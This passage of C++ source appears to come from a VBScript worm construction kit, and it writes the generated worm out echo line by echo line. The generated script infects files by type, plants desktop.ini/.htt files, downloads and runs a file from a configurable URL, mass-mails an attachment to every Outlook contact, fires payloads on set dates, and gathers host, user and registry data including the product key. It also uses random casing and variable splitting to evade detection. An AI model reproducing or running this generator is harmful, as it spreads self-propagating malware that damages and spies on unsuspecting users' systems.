                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafX + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    }
                }
                if (Form15->CheckBox20->Checked)
                {   // lnk inf
                    wstf(CaseRand("echo")+" elseif "+faf3+"=\"lnk\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    wstf(CaseRand("echo")+" " + sfso + ".copyfile \"%"+CaseRand("tmp")+"%\\" + lfds + ".lnk\","+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                }
                if (Form15->CheckBox14->Checked)
                {   // pif inf
                    wstf(CaseRand("echo")+" elseif "+faf3+"=\"pif\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    wstf(CaseRand("echo")+" " + sfso + ".copyfile \"%"+CaseRand("tmp")+"%\\" + pfds + ".pif\","+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                }
                wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " +faf2+ ".attributes=" +faf1+ ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            if (Form15->RadioButton13->Checked == true || Form15->RadioButton14->Checked == true || Form15->RadioButton12->Checked == true)
                wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        } // end all files

        wstf(CaseRand("echo")+" for each " + sfld + " in " + fldt + ".subfolders>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox57->Checked == true)
        {
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + diia + "=" + sfso + ".getfile(" + sfld + ".path & \"\\desktop.ini\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + diia + ".attributes=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + dia2 + "=" + sfso + ".getfile(" + sfld + ".path & \"\\" + dihn + ".htt\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + dia2 + ".attributes=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + sfso + ".copyfile \"%"+CaseRand("tmp")+"%\\" + itmp + "."+tfre+"\"," + diia + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + sfso + ".copyfile \"%"+CaseRand("tmp")+"%\\" + dihn + "."+tfre+"\"," + dia2 + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + diia + ".attributes=6>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + dia2 + ".attributes=6>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        wstf(CaseRand("echo")+" " + fldf + "(" + sfld + ".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end sub>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox46->Checked == true)
    {
        AnsiString aurd = Form15->ComboBox10->Text;
        if (aurd == "System" || aurd == "System32") aurd = "%"+CaseRand("windir")+"%" + "\\" + aurd;
        if (aurd == "Root") aurd = "C:";
        if (aurd == "Recycle Bin") aurd = "C:\\Recycled";
        wstf("echo if " + wshl + "."+CaseRand("regread")+"(\"HKCU\\Software\\" + plrn + "\\" +aurk+ "\")=\"\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo dim "+aur1+","+aur2+","+aur3+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo set "+aur1+"=createobject(\"inetctls.inet\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo "+aur1+".requesttimeout=20>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo "+aur2+"="+aur1+".openurl(\""+Form15->Edit14->Text+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo if not("+aur2+"=\"\") then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\" +aurk+ "\,\""+aurx+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo set "+aur3+"=" + sfso + ".createtextfile(\""+aurd+"\\"+Form15->Edit16->Text+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo "+aur3+".write "+aur2+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo "+aur3+".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox47->Checked == true)
            wstf("echo " + wshl + ".run \""+aurd+"\\"+Form15->Edit16->Text+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf("echo end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox61->Checked)
    {
        AnsiString msff;
        if (Form15->ComboBox20->Text == ".bat" || Form15->ComboBox20->Text == ".cmd") msff = istd+"\\" + tmpn + ".bat";
        if (Form15->ComboBox20->Text == ".vbs" || Form15->ComboBox20->Text == ".vbe") msff = istd+"\\" + istv + ".vbs";
        if (Form15->ComboBox20->Text == ".js" || Form15->ComboBox20->Text == ".jse") msff = istd+"\\" + istj + ".js";
        if (Form15->ComboBox20->Text == ".htm" || Form15->ComboBox20->Text == ".html") msff = "%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre;
        if (Form15->ComboBox20->Text == ".doc") msff = "%"+CaseRand("tmp")+"%\\" + wmid + "."+tfre;
        if (Form15->ComboBox20->Text == ".xls") msff = "%"+CaseRand("tmp")+"%\\" + emis + "."+tfre;
        if (Form15->CheckBox87->Checked)
            wstf("echo if " + wshl + "."+CaseRand("regread")+"(\"HKCU\\Software\\" + plrn + "\\" +msrk+ "\")=\"\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" dim "+mssar+","+mssal+"," + msfv + "," + msv2 + "," + msv3 + ","+msha+","+mssr+","+mssl+","+msbr+","+msbl+","+msar+","+msal+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->Memo4->Enabled && Form15->Memo4->Lines->Count>1)
        {
            AnsiString msat;
            bool msatmp = false;
            for (int n=0; n<Form15->Memo4->Lines->Count; n++)
            {
                if (msatmp) msat = msat + ",\"" + Form15->Memo4->Lines->Strings[n] + "\"";
                else
                {
                    msat = "\"" + Form15->Memo4->Lines->Strings[n] + "\"";
                    msatmp = true;
                }
            }
            wstf(CaseRand("echo")+" "+msal+"=array("+msat+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("randomize")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+msar+"="+msal+"(int("+AnsiString(Form15->Memo4->Lines->Count)+"*rnd))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + sfso + ".copyfile \""+msff+"\",\""+istd+"\\" +"\"&"+msar+"&\"" + Form15->ComboBox20->Text+"\"" + ffos);
        }
        if (Form15->Memo4->Enabled && Form15->Memo4->Lines->Count<=1)
        {
            wstf(CaseRand("echo")+" "+msar+"=\""+Form15->Memo4->Lines->Strings[0]+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + sfso + ".copyfile \""+msff+"\",\""+istd+"\\" +"\"&"+msar+"&\"" + Form15->ComboBox20->Text+"\"" + ffos);
        }
        if (Form15->Memo5->Enabled && Form15->Memo5->Lines->Count>1)
        {
            AnsiString mssat;
            bool mssatmp = false;
            for (int n=0; n<Form15->Memo5->Lines->Count; n++)
            {
                if (mssatmp) mssat = mssat + ",\"" + Form15->Memo5->Lines->Strings[n] + "\"";
                else
                {
                    mssat = "\"" + Form15->Memo5->Lines->Strings[n] + "\"";
                    mssatmp = true;
                }                           
            }
            wstf(CaseRand("echo")+" "+mssal+"=array("+mssat+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("randomize")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+mssar+"="+mssal+"(int("+AnsiString(Form15->Memo5->Lines->Count)+"*rnd))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        if (Form15->Memo5->Enabled && Form15->Memo5->Lines->Count<=1)
            wstf(CaseRand("echo")+" "+mssar+"=\""+Form15->Memo5->Lines->Strings[0]+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->Memo1->Lines->Count>1)
        {
            AnsiString msst;
            bool mstmp = false;
            for (int n=0; n<Form15->Memo1->Lines->Count; n++)
            {
                if (mstmp) msst = msst + ",\"" + Form15->Memo1->Lines->Strings[n] + "\"";
                else
                {
                    msst = "\"" + Form15->Memo1->Lines->Strings[n] + "\"";
                    mstmp = true;
                }
            }
            wstf(CaseRand("echo")+" "+mssl+"=array("+msst+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("randomize")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+mssr+"="+mssl+"(int("+AnsiString(Form15->Memo1->Lines->Count)+"*rnd))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        if (Form15->Memo1->Lines->Count<=1)
            wstf(CaseRand("echo")+" "+mssr+"=\""+Form15->Memo1->Lines->Strings[0]+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->Memo3->Enabled && Form15->Memo3->Lines->Count>1)
        {
            AnsiString msbt;
            bool msbtmp = false;
            for (int n=0; n<Form15->Memo3->Lines->Count; n++)
            {
                if (msbtmp) msbt = msbt + ",\"" + Form15->Memo3->Lines->Strings[n] + "\"";
                else
                {
                    msbt = "\"" + Form15->Memo3->Lines->Strings[n] + "\"";
                    msbtmp = true;
                }
            }
            wstf(CaseRand("echo")+" "+msbl+"=array("+msbt+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("randomize")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+msbr+"="+msbl+"(int("+AnsiString(Form15->Memo3->Lines->Count)+"*rnd))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        if (Form15->Memo3->Enabled && Form15->Memo3->Lines->Count<=1)
            wstf(CaseRand("echo")+" "+msbr+"=\""+Form15->Memo3->Lines->Strings[0]+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox86->Checked)
        {
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + mshg + "=" + sfso + ".opentextfile(\"%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+msha+"=" + mshg + ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + mshg + ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + msma + "=" + msoa + ".getnamespace(\"MAPI\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(ffos + rvtfk + CaseRand("set")+" " + mss2 + "=dressentrie");
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + msal + "=" + msma + ".addresslists>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for each " + mskn + " in " + msae + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if not("+mskn+".Ad%" + mss2 + "%s.Count=0) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for " + msfv + "=1 to "+mskn+".Ad%" + mss2 + "%s.Count>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + msfa + "(" + mskn + ".ad%" + mss2 + "%s(" + msfv + ").address)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("sub")+" " + msfa + "("+mssa+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + msoa + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"outlook.application\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + msci + "=" + msoa + ".createitem(0)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + msci + ".to="+mssa+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + msci + ".subject="+mssr+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox86->Checked)
            wstf(CaseRand("echo")+" " + msci + ".htmlbody="+msha+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        else
        {
            if (Form15->CheckBox91->Checked)
            {
                wstf(CaseRand("echo")+" "+CaseRand("randomize")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                Randomize();
                wstf(CaseRand("echo")+" " + msci + ".body="+msbr+"&chr(rnd*"+AnsiString(random(255))+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + msci + ".attachments.add \""+istd+"\\" +"\"&"+msar+"&\"" + Form15->ComboBox20->Text+"\",1,len(" + msci + ".body),"+mssar+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            else
            {
                wstf(CaseRand("echo")+" " + msci + ".body="+msbr+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " + msci + ".attachments.add(\""+istd+"\\" +"\"&"+msar+"&\"" + Form15->ComboBox20->Text+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
        }
        wstf(CaseRand("echo")+" " + msci + ".importance="+AnsiString(Form15->ComboBox21->ItemIndex)+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + msci + ".deleteaftersubmit=true>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if not(" + msci + ".to=\"\") then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + msci + ".send>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("end sub")+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox61->Checked == true && Form15->CheckBox88->Checked == true)
        {
            wstf(CaseRand("echo")+" dim "+safx+","+safk+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+safx+"=split("+safl+",vbcrlf)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" for each "+safk+" in "+safx+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + msfa + "("+safk+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        if (Form15->CheckBox87->Checked)
        {
            wstf("echo " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\" +msrk+ "\,\""+mskr+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf("echo end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
    }
    if (Form15->CheckBox42->Checked == true)
    {
        wstf(CaseRand("echo")+" dim " + vbv1 + ", " + vbv2 + ", " + vbv3 + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + vbv1 + "=int(" + wshl + "."+CaseRand("regread")+" (\"HKCU\\Software\\" + plrn + "\\" +plk1+ "\"))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + vbv2 + "=int(" + wshl + "."+CaseRand("regread")+" (\"HKCU\\Software\\" + plrn + "\\" +plk2+ "\"))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + vbv3 + "=int(" + wshl + "."+CaseRand("regread")+" (\"HKCU\\Software\\" + plrn + "\\" +plk3+ "\"))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if (not(int(" + vbv3 + ")=day(now)) or not(int(" + vbv2 + ")=month(now))) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + vbv1 + "=" + vbv1 + "+1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if (" + vbv1 + "=" + Form15->ComboBox3->Text + ") then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->RadioButton13->Checked == true || Form15->RadioButton14->Checked == true || Form15->RadioButton12->Checked == true)
        {
            wstf(CaseRand("echo")+" "+fvai+"=\""+fvps+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + drvs + "()>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+fvai+"=\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        if (Form15->CheckBox83->Checked && Form15->ComboBox23->ItemIndex == 2)
            wstf(CaseRand("echo")+" " + wshl + ".run \""+ftcd+"\\"+Form15->Edit25->Text+"\",0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + ".run \""+istd+"\\" + tmpn + ".bat " + parp + "\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + vbv1 + "=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\" + plk2 + "\",month(now)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\" + plk3 + "\",day(now)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\" + plk1 + "\"," + vbv1 + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox45->Checked == true)
    {
        if (Form15->ComboBox1->Text != "All" && Form15->ComboBox2->Text != "All")
            wstf(CaseRand("echo")+" if month(now)=" + plam + " and day(now)=" + Form15->ComboBox2->Text + " then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->ComboBox1->Text == "All" && Form15->ComboBox2->Text != "All")
            wstf(CaseRand("echo")+" if day(now)=" + Form15->ComboBox2->Text + " then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->ComboBox1->Text != "All" && Form15->ComboBox2->Text == "All")
            wstf(CaseRand("echo")+" if month(now)=" + plam + " then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->RadioButton13->Checked == true || Form15->RadioButton14->Checked == true || Form15->RadioButton12->Checked == true)
        {
            wstf(CaseRand("echo")+" "+fvai+"=\""+fvps+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + drvs + "()>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+fvai+"=\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        if (Form15->CheckBox83->Checked && Form15->ComboBox23->ItemIndex == 2)
            wstf(CaseRand("echo")+" " + wshl + ".run \""+ftcd+"\\"+Form15->Edit25->Text+"\",0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + ".run \""+istd+"\\" + tmpn + ".bat " + parp + "\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->ComboBox1->Text != "All" || Form15->ComboBox2->Text != "All")
            wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    if (Form15->CheckBox54->Checked == true)
    { // notification
        if (Form15->CheckBox55->Checked == true)
        {
            wstf(CaseRand("echo")+".on error resume next>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" dim " + emnt + "," + emns + ">>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + emnf + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + emns + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"w%" + vbih + "%.shell\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + emnn + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"w%" + vbih + "%.network\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + emn1 + "=" + emnf + ".createtextfile(\"%"+CaseRand("tmp")+"%\\" + emni + ".txt\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"Host Name:\"&" + emnn + ".computername>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"Domain Name:\"&" + emnn + ".userdomain>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"User Name:\"&" + emnn + ".username>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"Shared Network Drives:\">>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" "+CaseRand("set")+" " + emnd + "=" + emnn + ".enumnetworkdrives>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" for " + emnt + " = 0 to " + emnd + ".count - 1 step 2>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline " + emnd + ".item(" + emnt + "), " + emnd + ".item(" + emnt + "+1)>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" Next>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"Registered Owner: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"Registered Organization: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"Product Id: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductId\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"Product Key: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductKey\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"TAPI Country: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\User information\\TAPI Country\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"ISO Country: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\User information\\ISO Country\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"Product Identification: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\User information\\Product Identification\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"IE Version: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Internet Explorer\\Version\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"IE ProductID: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Internet Explorer\\ProductID\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"IE DefaultPage URL: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Page_URL\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"IE DefaultSearch URL: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Search_URL\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"IE Search Page: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"IE Start Page: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + emn1 + ".writeline \"IE Window Title: \"&"+emns+".regread(\"HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Window Title\")>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
